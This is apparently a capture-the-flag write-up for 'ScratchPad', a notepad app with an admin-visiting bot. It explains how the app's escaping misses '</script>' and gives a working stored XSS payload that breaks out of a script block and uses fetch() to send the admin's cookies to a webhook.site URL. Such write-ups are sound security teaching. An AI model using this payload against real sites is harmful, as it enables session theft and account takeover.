# ScratchPad — Stored XSS + Cookie Stealing

## Overview

The application is an online notepad where users can create and view notes. It also features a **"Report to Admin"** button on each note's page, which causes a bot (with admin session cookies) to visit that note's URL.

---

## Vulnerability

The note body is sanitized with `htmlspecialchars` when rendered in HTML, preventing direct tag injection. However, the note body is also **embedded raw inside a `<script>` block** for a clipboard feature:

```javascript
const note = "<NOTE_BODY_HERE>";
```

The server escapes `'` → `\'` and `"` → `\"` and `\` → `\\`, blocking standard JS string escape breaking. However, it does **not** escape `</script>` tags, making the page vulnerable to **script tag breaking**.

---

## Exploit

By injecting `</script>` in the note body, the browser prematurely closes the current script block. A new `<script>` tag is then opened with arbitrary JS. Backticks are NOT escaped by the server, so they can be used as string delimiters instead of quotes.

The trailing `"` from the original `const note = "..."` would truncate `document.cookie`, so `//` is appended to comment it out.

### Final Payload

```
</script><script>fetch(`https://webhook.site/<token>/?c=`+document.cookie)//
```

### Resulting HTML

```html
<script> const note = "</script>
<script>fetch(`https://webhook.site/<token>/?c=`+document.cookie)//";</script>
```
